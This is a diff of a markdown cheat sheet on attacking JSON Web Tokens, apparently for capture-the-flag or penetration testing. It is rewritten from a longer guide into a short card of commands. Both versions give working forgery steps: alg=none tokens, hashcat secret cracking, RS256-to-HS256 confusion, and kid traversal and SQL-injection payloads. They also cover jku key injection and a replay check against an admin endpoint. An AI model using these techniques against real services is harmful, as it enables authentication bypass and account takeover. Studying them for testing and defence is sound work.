@@ -1,94 +1,85 @@
-# JWT Attacks
+# JWT attacks — compact field summary
 
-## Decode Without Verification
-```bash
-# JWT structure: header.payload.signature (base64url each part)
-echo "<header_part>" | base64 -d
-echo "<payload_part>" | base64 -d
+The short version: `jwt-deep.md` is the full method, `extended-jwt.md` is
+the raw payload corpus. This file is the desk card — the technique list
+you scan when you have 30 seconds and a token in hand.
+
+---
+
+## 1. The decision in one look
+
 ```
-Or use `jwt.io` locally / `pyjwt` for structured decoding.
+token decodes to JSON?        → try alg=none first
+alg:RS*/ES*/EdDSA?            → RS→HS confusion IF pubkey reachable
+header has kid/jku/x5u?       → header injection (traversal/SSRF/self-host)
+secret guessable?             → session_dissect --try-keys
+token in URL/cookie readable? → steal not forge
+```
 
-## alg:none Attack
-Some libraries accept `"alg": "none"` and skip signature verification entirely.
+## 2. alg=none — 5-second test
+
+```bash
+python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''
+# try variants: --alg none / None / NONE / nOnE
+# hand: strip signature, keep trailing dot → aaa.bbb.
+```
+
+## 3. Weak secret
+
+```bash
+python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist secrets.txt
+# or hashcat: hashcat -m 16500 -a 0 "$T" wordlist.txt
+# then: jwt_forge --secret <cracked>
+```
+
+## 4. RS→HS confusion
+
+```bash
+python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem
+```
+
+Precondition: token signed RS*, public key reachable (`/jwks.json`,
+cert, bundle, `openssl s_client`).
+
+## 5. kid / jku / x5u header injection
+
+```bash
+python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''
+python3 tools/web/jwt_forge.py --token "$T" --kid /proc/sys/kernel/randomize_va_space --kid-secret '2'
+python3 tools/web/jwt_forge.py --token "$T" --jku "https://you/jwks.json"
+```
+
+## 6. Claim-side bugs (no signature needed)
+
+- `exp` past but accepted → replay
+- `aud`/`iss` unchecked → cross-service token
+- `sub` coercion `"1"`/`1`/`"01"`/`"1e0"`/`"+1"` → numeric-string to user 1
+- `sub`/`name` into SQL → `skills/web-sqli/`
+- `jti` unchecked → replay revoked tokens
+
+## 7. The verify-call idioms that burn
+
 ```python
-import base64, json
-
-header = {"alg": "none", "typ": "JWT"}
-payload = {"user": "admin", "role": "admin"}
-
-def b64url(data):
-    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=')
-
-token = b64url(header) + b'.' + b64url(payload) + b'.'
-print(token.decode())
+jwt.decode(t, key)                                # alg from header
+jwt.decode(t, key, algorithms=["HS256","RS256"])  # confusion
+jwt.decode(t, options={"verify_signature":False}) # dead
+jwt.decode(t, verify=False)                       # dead (pyjwt<2)
 ```
-Test by sending this token with no signature (trailing dot, empty signature).
 
-## Algorithm Confusion (RS256 → HS256)
-If the server uses RS256 (asymmetric) but the verification code doesn't
-enforce the algorithm, an attacker who has the public key can forge a
-token signed with HS256 using the public key as the HMAC secret.
-```python
-import jwt
-
-public_key = open('public.pem').read()  # obtained from server (often exposed)
-forged = jwt.encode({"user": "admin", "role": "admin"}, public_key, algorithm="HS256")
-print(forged)
+```javascript
+jwt.verify(t, SECRET)                     // alg from header
+jwt.decode(t)                             // dead
+jwt.verify(t, SECRET, {algorithms:['HS256','RS256']}) // confusion
 ```
-Test: send the forged token and see if it's accepted.
 
-## Weak Secret Brute Force (HS256)
+## 8. Replay verification
+
 ```bash
-# hashcat mode 16500 for JWT HS256 cracking
-hashcat -a 0 -m 16500 jwt.txt wordlist.txt
-
-# or jwt_tool
-python3 jwt_tool.py <token> -C -d wordlist.txt
+python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
+  --url "$BASE/admin" --header "Authorization: Bearer $FORGED" \
+  --evidence-regex '"role"\s*:\s*"admin"|flag\{' --evidence-kind impact \
+  --on-match confirms --on-miss refutes
 ```
 
-## kid (Key ID) Header Injection
-```
-# If 'kid' header value is used to look up key from filesystem/DB without
-# sanitization, try path traversal or SQL injection via kid:
-{"alg":"HS256","kid":"../../../../dev/null"}   # forces empty key -> HMAC with ""
-{"alg":"HS256","kid":"' UNION SELECT 'attacker_secret'--"}
-```
-
-## jwk / x5u Header Injection
-Some libraries fetch the verification key from a URL specified in the token
-header itself (`jwk`, `jku`, `x5u`). If unvalidated, an attacker can host
-their own key and sign the token with it.
-```json
-{
-  "alg": "RS256",
-  "jwk": {
-    "kty": "RSA",
-    "n": "<attacker_public_key_modulus>",
-    "e": "AQAB",
-    "kid": "attacker-key"
-  }
-}
-```
-Generate attacker keypair, embed public key in `jwk` header, sign payload
-with corresponding private key.
-
-## Expiration / Replay Testing
-```
-[ ] Does the server actually check "exp" claim?
-[ ] Can an expired token still be used?
-[ ] Is there a token revocation/blacklist mechanism, or are all issued
-    tokens valid until natural expiry (logout doesn't invalidate)?
-```
-
-## Claim Tampering (Signed but Unverified Fields)
-```
-[ ] Does the app trust claims like "role" or "is_admin" from a valid but
-    attacker-modifiable structure (e.g. no signature at all, or signature
-    checked but role re-derived insecurely elsewhere)?
-```
-
-## Tooling
-```bash
-# jwt_tool - comprehensive JWT testing
-python3 jwt_tool.py <token> -M at   # "all tests" mode, tries known attacks
-```
+The forged token accepted on a *protected* endpoint is the only verdict
+that counts.
